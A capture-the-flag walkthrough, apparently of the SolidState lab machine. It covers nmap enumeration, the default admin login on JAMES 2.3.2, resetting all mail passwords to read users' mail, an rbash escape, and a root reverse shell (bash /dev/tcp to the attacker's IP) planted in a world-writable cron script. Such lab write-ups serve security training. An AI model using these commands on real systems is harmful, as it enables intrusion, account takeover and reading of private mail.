# SolidState

## Information Gathering

- Start with some information gathering
    - Machine Name: solidtate
    - Machine IP: 10.10.10.51

## Enumeration

- Start with a basic nmap scans

```s
$ sudo nmap -sC -sV -oN nmap/solidstate.nmap 10.10.10.51 -T5 -Pn

PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA)
|   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA)
|_  256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519)
25/tcp  open  smtp    JAMES smtpd 2.3.2
|_smtp-commands: solidstate Hello nmap.scanme.org (10.10.14.7 [10.10.14.7])
80/tcp  open  http    Apache httpd 2.4.25 ((Debian))
|_http-title: Home - Solid State Security
|_http-server-header: Apache/2.4.25 (Debian)
110/tcp open  pop3    JAMES pop3d 2.3.2
119/tcp open  nntp    JAMES nntpd (posting ok)
Service Info: Host: solidstate; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- Also a thorough nmap scan

```s
$ sudo nmap -p- -A -oN nmap/all.nmap 10.10.10.51 -T5 -Pn
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA)
|   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA)
|_  256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519)
25/tcp   open  smtp    JAMES smtpd 2.3.2
|_smtp-commands: solidstate Hello nmap.scanme.org (10.10.14.7 [10.10.14.7]), PIPELINING, ENHANCEDSTATUSCODES
80/tcp   open  http    Apache httpd 2.4.25 ((Debian))
|_http-title: Home - Solid State Security
|_http-server-header: Apache/2.4.25 (Debian)
110/tcp  open  pop3    JAMES pop3d 2.3.2
119/tcp  open  nntp    JAMES nntpd (posting ok)
4555/tcp open  rsip?
| fingerprint-strings: 
|   GenericLines: 
|     JAMES Remote Administration Tool 2.3.2
|     Please enter your login and password
|     Login id:
|     Password:
|     Login failed for 
|_    Login id:
```

## Foothold

The server is running a vulnerable application, [JAMES 2.3.2](https://james.apache.org/). There is a [publicly disclosed](https://www.exploit-db.com/exploits/50347) vulnerability for this version of JAMES server. However, in order to execute this exploit, an attacker will need to be authenticated. Let's try the default credentials of `root:root`

```s
$ telnet 10.10.10.51 4555
Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is '^]'.
JAMES Remote Administration Tool 2.3.2
Please enter your login and password
Login id:
root
Password:
root
Welcome root. HELP for a list of commands
```

With access to the administrator account, we are able to compromise change other users passwords and execute arbitrary code. 

Looking at what users are available on the machine:

```s
help                                    display this help
listusers                               display existing accounts
countusers                              display the number of existing accounts
adduser [username] [password]           add a new user
verify [username]                       verify if specified user exist
deluser [username]                      delete existing user
setpassword [username] [password]       sets a users password
setalias [user] [alias]                 locally forwards all email for 'user' to 'alias'
showalias [username]                    shows a users current email alias
unsetalias [user]                       unsets an alias for 'user'
setforwarding [username] [emailaddress] forwards a users email to another email address
showforwarding [username]               shows a users current email forwarding
unsetforwarding [username]              removes a forward
user [repositoryname]                   change to another user repository
shutdown                                kills the current JVM (convenient when James is run as a daemon)
quit                                    close connection

listusers
Existing accounts 5
user: james
user: thomas
user: john
user: mindy
user: mailadmin
```

We have the ability to change the password of all the users. Let's change all their account passwords to `ozy`. We can then login to their POP3 accounts and compromise the confidentiality of their emails.

```s
setpassword james ozy
Password for james reset
setpassword thomas ozy
Password for thomas reset
setpassword john ozy
Password for john reset
setpassword mindy ozy
Password for mindy reset
setpassword mailadmin ozy
Password for mailadmin rese
```

Now we can iteratively login to each account and view their contents.

The first user to have anything interesting is `john`

```s
user john
+OK
pass ozy
+OK Welcome john
list
+OK 1 743
1 743
.
retr 1
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <9564574.1.1503422198108.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: john@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
          for <john@localhost>;
          Tue, 22 Aug 2017 13:16:20 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:16:20 -0400 (EDT)
From: mailadmin@localhost
Subject: New Hires access
John, 

Can you please restrict mindys access until she gets read on to the program. Also make sure that you send her a tempory password to login to her accounts.

Thank you in advance.

Respectfully,
James

```

Looks like mindy might have information we'll be interested in. Let's login to `mindy` account:

```s
retr 2
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <16744123.2.1503422270399.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
          for <mindy@localhost>;
          Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
From: mailadmin@localhost
Subject: Your Access

Dear Mindy,


Here are your ssh credentials to access the system. Remember to reset your password after your first login. 
Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path. 

username: mindy
pass: P@55W0rd1!2@

Respectfully,
James
```

Now we have some credentials: `mindy:P@55W0rd1!2@`

Let's see if these credentials work:

```s
$ ssh mindy@10.10.10.51          
mindy@10.10.10.51's password: 
Linux solidstate 4.9.0-3-686-pae #1 SMP Debian 4.9.30-2+deb9u3 (2017-08-06) i686

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Aug 22 14:00:02 2017 from 192.168.11.142
mindy@solidstate:~$
```

## Privilege Escalation

### Shell Breakout

After executing some commands it becomes evident that we dropped into a restricted shell:

```s
mindy@solidstate:~$ id
-rbash: id: command not found
mindy@solidstate:~$ whoami
-rbash: whoami: command not found
```

There are a few breakout methods, but the easiest way is to use the `-t` to force a `/bin/bash` shell.

```s
$ ssh mindy@10.10.10.51 -t bash
mindy@10.10.10.51s password: 
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ id
uid=1001(mindy) gid=1001(mindy) groups=1001(mindy)
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ whoami
mindy
```

### root

Poking around the box, we'll quickly find a file `/opt/tmp.py`.

```python
#!/usr/bin/env python
import os
import sys
try:
     os.system('rm -r /tmp/* ')
except:
     sys.exit()
```

Looking at the permissions:

```s
$ ls -lah
total 16K
drwxr-xr-x  3 root root 4.0K Aug 22  2017 .
drwxr-xr-x 22 root root 4.0K May 27  2022 ..
drwxr-xr-x 11 root root 4.0K Apr 26  2021 james-2.3.2
-rwxrwxrwx  1 root root  105 Aug 22  2017 tmp.py
```

This file owned by root but is world writeable. I have a hunch that root is running a cronjob and run this every so often. There are a couple of ways we could verify this: First, we can write a file into `/tmp` and wait for the file to be deleted. Another way is to drop a [Pspy](https://github.com/DominicBreuker/pspy) listener onto the machine. In an actual engagement, we'll probably go with the former. However, I've never used Pspy befores so I'll go with that option. We'll first need to drop the binary onto the machine using `wget`:

```s
$ wget http://10.10.14.7:8000/pspy32
$ chmod +x pspy32
$ ./pspy32
...<snip>...
2023/08/20 14:18:01 CMD: UID=0     PID=1978   | /usr/sbin/CRON -f 
2023/08/20 14:18:01 CMD: UID=0     PID=1979   | /usr/sbin/CRON -f 
2023/08/20 14:18:01 CMD: UID=0     PID=1980   | /bin/sh -c python /opt/tmp.py 
2023/08/20 14:18:01 CMD: UID=0     PID=1981   | sh -c rm -r /tmp/*
...<snip>...
```

The script is executed as root. Let's add a reverse shell line in `/opt/tmp.py`:

```python
#!/usr/bin/env python
import os
import sys
try:
     os.system('rm -r /tmp/* ')
except:
     sys.exit()

os.system("bash -c '/bin/bash -i >& /dev/tcp/10.10.14.7/1337 0>&1'")
```

After a while:

```
$ nc -lnvp 1337
root@solidstate:~# id
id
uid=0(root) gid=0(root) groups=0(root)
root@solidstate:~# whoami
whoami
root
```